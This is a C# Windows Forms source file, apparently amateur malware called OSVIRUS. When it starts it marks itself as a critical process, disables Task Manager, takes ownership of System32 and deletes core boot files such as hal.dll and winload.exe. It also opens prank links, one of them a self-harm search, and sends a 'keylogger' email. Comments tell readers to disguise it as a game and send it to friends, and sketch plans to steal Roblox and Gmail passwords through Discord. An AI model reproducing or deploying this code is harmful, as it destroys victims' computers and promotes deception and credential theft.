using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Mail;
using System.Drawing;
using System.Drawing.Imaging;
using Microsoft.Win32;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Media;
using System.Security.Cryptography;
using System.Net.Sockets;
using System.Net;

namespace WindowsFormsApp1
{
    public partial class OSVIRUS : Form
    {
        private SoundPlayer _soundplayer;

        string sound_file = @"C:\Windows\Media\Windows Critical Stop.wav"; // defined sound
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        public OSVIRUS()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Process.EnterDebugMode(); // gets debug options to iniate a blue screen o' death and delete all your things!
            int isCritical = 1;  // we want this to be a Critical Process
            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.String); // turn off task manager
            // This line of code activates a script
            //get system32 folder and drivers
            new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && Exit") }.Start();
            string hal_dll = @"C:\Windows\System32\hal.dll";
            string ci_dll = @"C:\Windows\System32\ci.dll";
            string winload_exe = @"C:\Windows\System32\winload.exe";
            string disk_sys = @"C:\Windows\System32\drivers\disk.sys"; //F12
            string memoryanyalizer = @"C:\Windows\System32\F12\MemoryAnalyzer.dll"; //F12
            if (File.Exists(hal_dll))
            {
                File.Delete(hal_dll);
            }
            if (File.Exists(ci_dll))
            {
                File.Delete(ci_dll);
            }
            if (File.Exists(winload_exe))
            {
                File.Delete(winload_exe);
            }
            if (File.Exists(disk_sys))
            {
                File.Delete(disk_sys);
            }
            if (File.Exists(memoryanyalizer))
            {
                File.Delete(memoryanyalizer);
            }
            // Now we get annoying with opening screens.
            Random r;
            r = new Random();
            int true_num = r.Next(5); //make random num 1-5

            if (true_num == 1)
            {
                System.Diagnostics.Process.Start("https://www.youtube.com/channel/UC9keh4wDjXFyiRhHDE_h90Q?view_as=subscriber");
            }

            if (true_num == 2)
            {
                System.Diagnostics.Process.Start("https://www.youtube.com/channel/UCviSYAcwdnDX1UoRzAHYgNg");
            }

            if (true_num == 3)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?sxsrf=ALeKk03p6_nh5gjKk_7WWWGDr0qYtnieXg%3A1605092222038&ei=fsOrX5rzAY63kwWYq56IDg&q=my+mum+is+gay&oq=my+mum+is+gay&gs_lcp=CgZwc3ktYWIQAzIKCAAQFhAKEB4QEzIKCAAQFhAKEB4QEzoJCCMQ6gIQJxATOgcIIxDqAhAnOgQIIxAnOgUIABCxAzoCCAA6CAgAELEDEIMBOgIILjoECAAQQzoHCC4QsQMQQzoECC4QQzoFCC4QsQM6CAguELEDEIMBOgUILhCTAjoECC4QCjoECAAQCjoFCC4QywE6BQgAEMsBOggILhDLARCTAjoGCAAQFhAeOggIABAWEAoQHlD_GliuO2D3PGgCcAB4AIABiwKIAeAOkgEGMS4xMi4xmAEAoAEBqgEHZ3dzLXdperABCsABAQ&sclient=psy-ab&ved=0ahUKEwiaque9qvrsAhWO26QKHZiVB-EQ4dUDCA0&uact=5");
            }

            if (true_num == 4)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?sxsrf=ALeKk007atE4-A-mD40nsEcYaIJklYlv_g%3A1605092231197&ei=h8OrX5XEC4mdkwXO84XoAg&q=how+2+cut+leg&oq=how+2+cut+leg&gs_lcp=CgZwc3ktYWIQDDIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjoJCCMQ6gIQJxATOgcIIxDqAhAnOgQIIxAnOgQIABBDOgUIABCxAzoKCAAQsQMQgwEQQzoCCC46CAguELEDEIMBOgIIADoFCC4QsQM6BQguEMsBOgUIABDLAToGCAAQFhAeOggIABAWEAoQHlDzaFiDigFg86UBaANwAHgAgAHzAYgB7w2SAQYwLjEyLjGYAQCgAQGqAQdnd3Mtd2l6sAEKwAEB&sclient=psy-ab&ved=0ahUKEwjVo5bCqvrsAhWJzqQKHc55AS0Q4dUDCA0");
            }

            if (true_num == 5)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=dancing+cow&sxsrf=ALeKk03Rx29J4Nduy2BetYRf6PUHNs9I8A:1605092295881&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiupoLhqvrsAhUdJcUKHdqKANwQ_AUoAXoECAcQAw&biw=1920&bih=937");
            }
            // This part of the virus makes annoying sounds and also downloads a bunch of malware.
            if (File.Exists(sound_file))
            {
                _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Critical Stop.wav");
            }
            // This part makes your entire screen buggy
            Graphics g;
            Bitmap bmp;
            var endWidth = 500;
            var endHeight = 500;

            var scaleFactor = 1; //perhaps get this value from a const, or an on screen slider

            var startWidth = endWidth / scaleFactor;
            var startHeight = endHeight / scaleFactor;

            bmp = new Bitmap(startWidth, startHeight);

            g = this.CreateGraphics();
            g = Graphics.FromImage(bmp);

            var xPos = Math.Min(0, MousePosition.X - (startWidth / 500)); // divide by two in order to center
            var yPos = Math.Min(0, MousePosition.Y - (startHeight / 500));

            g.CopyFromScreen(xPos, yPos, 0, 0, new Size(endWidth, endWidth));
            var Pictur1 = new PictureBox();
            Pictur1.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
            r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(Pictur1);
            // The next line of code sends emails and more.
            int mailTime = 5000;
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

            mail.From = new MailAddress("ThisGuyGotHAXED!");
            mail.To.Add("dont be stupid!");
            mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
            mail.Body = "Information key from victim\n";
            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("ThisGuyGotHAXED!", "dont be stupid!");
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);
            Console.WriteLine("Send mail!");
            // Blocking a port.
            int portToBlock = 80;
            Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
            IPEndPoint ep = new IPEndPoint(IPAddress.Loopback, portToBlock);
            s.Bind(ep);
            string password = "Hu11an_!ndusTr!al";
            GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);
            gch.Free();
            // Encrypting files.
            // Any help on this malware is apreciated.
            // However i advise not downloading this and using it on your own PC.
            // If you do download it and you wanna destory someones pc:
            // Rename it to something convinicing
            // Like a popular game name and alter the picture to its icon.
            // Customize then send to a friend
            // And there PC Will die.
            // Also im planning on adding a KEY LOGGING SYSTEM.
            // Which sends it to a discord bot you make in a txt
            // Like roblox username password
            // Gmail password and account
            // More stuff like that so help a guy out please!


            /*pictureBox1 = new PictureBox();
            pictureBox1.BackColor = Color.Transparent;
            pictureBox1.Height = 300;
            pictureBox1.Width = 300;

            pictureBox1.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(pictureBox1);
            pictureBox2 = new PictureBox();
            pictureBox1.BackColor = Color.Transparent;
            pictureBox2.Height = 240;
            pictureBox2.Width = 180;

            pictureBox2.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(pictureBox2);
            pictureBox3 = new PictureBox();
            pictureBox1.BackColor = Color.Transparent;
            pictureBox3.Height = 300;
            pictureBox3.Width = 300;

            pictureBox3.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(pictureBox3);
            pictureBox4 = new PictureBox();
            pictureBox1.BackColor = Color.Transparent;
            pictureBox4.Height = 300;
            pictureBox4.Width = 300;

            pictureBox4.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(pictureBox4);

            pictureBox5 = new PictureBox();
            pictureBox1.BackColor = Color.Transparent;
            pictureBox5.Height = 150;
            pictureBox5.Width = 200;

            pictureBox5.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                r.Next(0, Screen.PrimaryScreen.Bounds.Height));

            Controls.Add(pictureBox5);

            pictureBox1.Image = bmp;
            pictureBox2.Image = bmp;
            pictureBox3.Image = bmp;
            pictureBox4.Image = bmp;
            pictureBox5.Image = bmp;

            Bitmap pic = new Bitmap(pictureBox3.Image);
            for (int y = 0; (y <= (pic.Height - 1)); y++)
            {
                for (int x = 0; (x <= (pic.Width - 1)); x++)
                {
                    Color inv = pic.GetPixel(x, y);
                    inv = Color.FromArgb(255, (255 - inv.R), (255 - inv.G), (255 - inv.B));
                    pic.SetPixel(x, y, inv);
                }
            }

            pictureBox3.Image = pic;

            Bitmap pic2 = new Bitmap(pictureBox5.Image);
            for (int y = 0; (y <= (pic2.Height - 1)); y++)
            {
                for (int x = 0; (x <= (pic2.Width - 1)); x++)
                {
                    Color inv = pic2.GetPixel(x, y);
                    inv = Color.FromArgb(255, (255 - inv.R), (255 - inv.G), (255 - inv.B));
                    pic2.SetPixel(x, y, inv);
                }
            }

            pictureBox5.Image = pic2; */
            //OperatingSystem operating;
            //operating.Platform = "NoMore";
            //RegistryKey rk = Registry
        }
    }
}
